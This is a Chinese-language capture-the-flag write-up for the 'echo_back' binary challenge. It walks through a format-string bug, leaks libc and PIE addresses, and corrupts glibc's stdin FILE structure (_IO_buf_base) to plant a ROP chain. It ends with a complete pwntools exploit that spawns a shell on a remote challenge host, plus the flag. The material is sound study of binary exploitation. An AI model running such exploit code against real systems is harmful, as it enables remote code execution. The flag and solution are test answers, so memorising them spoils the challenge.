# echo_back

[题目地址](https://adworld.xctf.org.cn/challenges/details?hash=662075d8-bd86-42c9-9a86-33f545b3846d_2)

一篇笔记的内容是解析wp，这样就不是单纯抄答案了，对吧？

-   Arch:     amd64-64-little
    <Br>RELRO:    Full RELRO
    <Br>Stack:    Canary found
    <br>NX:       NX enabled
    <Br.>PIE:      PIE enabled

checksec带来了坏消息。main函数是一个菜单式实现。

```c
void Main(void)
{
  bool bVar1;
  int input;
  long in_FS_OFFSET;
  char local_18 [8];
  long local_10;
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  SetUp();
  alarm(0x3c);
  PrintTitle();
  bVar1 = false;
  memset(local_18,0,8);
  while( true ) {
    while (input = PrintMenu(), input == 2) {
      EchoBack(local_18);
    }
    if (input == 3) break;
    if ((input == 1) && (!bVar1)) {
      SetName(local_18);
      bVar1 = true;
    }
  }
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

有两个功能。都看看。

```c
void EchoBack(char *param_1)
{
  long in_FS_OFFSET;
  uint length;
  char local_18 [8];
  long local_10;
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  memset(local_18,0,8);
  printf("length:");
  __isoc99_scanf(&DAT_00100f18,&length);
  getchar();
  if (((int)length < 0) || (6 < (int)length)) {
    length = 7;
  }
  read(0,local_18,(ulong)length);
  if (*param_1 == '\0') {
    printf("anonymous say:");
  }
  else {
    printf("%s say:",param_1);
  }
  printf(local_18);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

一眼格式化字符串漏洞。但是还不知道怎么利用。

```c
void SetName(void *param_1)
{
  printf("name:");
  read(0,param_1,7);
  return;
}
```

目前看不出来这个功能有什么用，还是先看看格式化字符串吧。大佬，也就是要分析的[wp](https://blog.csdn.net/seaaseesa/article/details/103114909)告诉我们，遇见格式化字符串就要有泄露地址的直觉。那么首先考虑泄露的地址就是使用libc.sym可以找到的地址，因为这样两者相减就能得到libc加载的基地址，知道libc基地址才可以推出来libc中要用的函数例如system的地址。接着还要再泄露一个elf中有的地址，因为main等函数在elf中。

在漏洞的printf处，我们发现在距离当前栈顶13个位置处，有__libc_start_main+F0的地址。慢慢测试发现这个值位于%19$p。泄露这个地址之后-f0-libc.sym['__libc_start_main']就可以得到libc加载的基地址了。

同理我们可以从这个格式化字符串出发，调试找到什么参数可以泄露有关main的地址。测试得到为%13$p，为main+0x9c。至此所有地址已泄露完毕，该想想怎么利用了。rop链目前无法构造，有if语句限制我们的输入只能为7，无法溢出。但是我们有格式化字符串，可以直接用\%n这类特殊格式改写main的返回地址，也就是\%19$p。仔细一想发现没那么简单，%19\$n是把%19\$p的数据当成一个地址，然后往那个地址里写数据。比如a地址指向b，使用上面提到的方法改写的是b指向的地址而不是a指向的地址。

所以我们要让改写的b有意义。SetName不再没用，它会改写param_1指向的内容。（虽然我不知道大佬是怎么知道param_1指向的是main的返回地址的）我们顺着这个思路，想想把main的返回地址指向什么最有用。很容易就能想到把main_ret指向main_ret自身，因为我们已经知道它的地址了。但是这样没用，即使我们能修改main_ret的地址，修改到哪里呢？rop链？没有啊，构造也不行啊，7个字节能构造出什么玩意？因此我们需要找个办法把输入限制改了。

我们可以利用printf漏洞先去攻击scanf内部结构，这样就可以直接利用scanf往目标处输入数据。scanf内部使用了_IO_new_file_underflow来读取文件，写入fp->_IO_buf_base处，长度由_IO_SYSREAD (fp, fp->_IO_buf_base,fp->_IO_buf_end - fp->_IO_buf_base); 决定。如果_IO_buf_base和_IO_buf_end被我们控制了，_IO_buf_base处的溢出不久手到擒来了吗？我们来看看_IO_buf_base和_IO_buf_end在哪。

scanf从_IO_FILE *stdin = (FILE *) &_IO_2_1_stdin_;中读取数据，也就是stdin。而stdin是一个FILE (_IO_FILE) 结构体指针。FILE的结构如下。

```c
struct _IO_FILE  
{  
  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */  
  
  /* The following pointers correspond to the C++ streambuf protocol. */  
  char *_IO_read_ptr;   /* Current read pointer */  
  char *_IO_read_end;   /* End of get area. */  
  char *_IO_read_base;  /* Start of putback+get area. */  
  char *_IO_write_base; /* Start of put area. */  
  char *_IO_write_ptr;  /* Current put pointer. */  
  char *_IO_write_end;  /* End of put area. */  
  char *_IO_buf_base;   /* Start of reserve area. */  
  char *_IO_buf_end;    /* End of reserve area. */
}
```

只截取了用得着的声明部分。_IO_buf_base和_IO_buf_end在最下面。从上面可以看出_IO_buf_base在stdin结构体的第8个，因此它的地址是stdin结构体的地址+0x8*7（它是第7个，每个指针长8个字节）。决定了，就改_IO_buf_base，那就可以使用SetName将返回地址指向它了。虽然SetName只能输入7个字节，但是64位地址末尾几乎都有0，所以少个0也没啥问题。

接下来格式化字符串改_IO_buf_base的最后1字节为0。举个实际的例子会更好理解。假设当前stdin地址为0x7F9EA22488E0，那么base地址就为0x7F9EA2248918。覆盖末尾为0就变成了0x7F9EA2248900，也就是0x7F9EA22488E0+0x8*4处。看上面的对照一下，这是哪？_IO_write_base。_IO_write_base在注释里看到是Start of put area，也就是当前接收输入的位置。_IO_buf_end没有改变，那么现在我们就可以从0x7F9EA2248900处开始往后写0x64个字节了，因为读取的长度上面提到过，_IO_buf_end - fp->_IO_buf_base。从这里开始0x64字节，完全可以覆盖关键两个指针，绕过7个字节的限制。

对于_IO_buf_base之前的数据(_IO_write_base、_IO_write_ptr、_IO_write_end)，我们最好原样的放回，不然不知道会出现什么问题，经过调试，发现它们的值都是0x83 + _IO_2_1_stdin_addr。payload要在length处发送，因为length处使用了scanf。改了scanf的关键代码当然要用scanf来接收，不然触发不了没意思啊。

现在还剩下最后一个判断。

```c
if (fp->_IO_read_ptr < fp->_IO_read_end)  
    return *(unsigned char *) fp->_IO_read_ptr; 
```

这里不绕过后面的根本没法执行，全部白干。我们需要fp->_IO_read_ptr至少等于fp->_IO_read_end。之前我们在覆盖结构体数据时，后面执行了这一步:  fp->_IO_read_end += count; 因此现在的_IO_read_end加上了payload的长度。而getchar()的作用是使fp->_IO_read_ptr加1。又因为在覆盖结构体后，scanf的后面有一个getchar，执行了一次，所以我们只需要执行len(payload)-1次getchar()，然后接下来向length发送我们的rop再推出即可获得shell。

```python
from pwn import *  
sh = remote('61.147.171.105',64236)   
#main在elf中的静态地址  
main_s_addr = 0xC6C  
#pop rdi  
#retn  
#在elf中的静态地址  
pop_s_rdi = 0xD93  
bin_sh=0x000000000018cd57 
_IO_2_1_stdin_ = 3950816
   
   
def echoback(content):  
   sh.sendlineafter('choice>>','2')  
   sh.sendlineafter('length:','7')  
   sh.send(content)  
   
def setName(name):  
   sh.sendlineafter('choice>>','1')  
   sh.sendafter('name:',name)  
   
   
   
echoback('%19$p')  
   
sh.recvuntil('0x')  
#泄露__libc_start_main的地址  
__libc_start_main = int(sh.recvuntil(b'-').split(b'-')[0],16) - 0xF0  
#得到libc加载的基地址  
libc_base = __libc_start_main - 132928
system_addr = libc_base + 283536
binsh_addr = libc_base + bin_sh
_IO_2_1_stdin_addr = libc_base + _IO_2_1_stdin_  
_IO_buf_base = _IO_2_1_stdin_addr + 0x8 * 7  
   
#泄露main的地址  
echoback('%13$p')  
sh.recvuntil('0x')  
main_addr = int(sh.recvuntil(b'-').split(b'-')[0],16) - 0x9C  
elf_base = main_addr - main_s_addr  
pop_rdi = elf_base + pop_s_rdi  
   
echoback('%12$p')  
sh.recvuntil('0x')  
#泄露main的ebp的值  
main_ebp = int(sh.recvuntil(b'-').split(b'-')[0],16)  
#泄露存放(main返回地址)的地址  
main_ret = main_ebp + 0x8  
   
setName(p64(_IO_buf_base))  
#覆盖_IO_buf_base的低1字节为0  
echoback('%16$hhn')  
   
#修改_IO_2_1_stdin_结构体  
payload = p64(0x83 + _IO_2_1_stdin_addr)*3 + p64(main_ret) + p64(main_ret + 0x8 * 3)  
sh.sendlineafter('choice>>','2')  
sh.sendafter('length:',payload)  
sh.sendline('')  
#不断调用getchar()使fp->_IO_read_ptr与使fp->_IO_read_end相等  
for i in range(0,len(payload)-1):  
   sh.sendlineafter('choice>>','2')  
   sh.sendlineafter('length:','')  
   
#对目标写入ROP  
sh.sendlineafter('choice>>','2')  
payload = p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)  
sh.sendafter('length:',payload)  
#这个换行最好单独发送  
sh.sendline('')  
#getshell  
sh.sendlineafter('choice>>','3')  
   
sh.interactive()
```

ps:这个exp执行到最后一个sh.sendlineafter('length:','')会卡一下，不要急，等等shell就来了。

- ### Flag
  > cyberpeace{3e15cd2c05482a80e512106cdddfab08}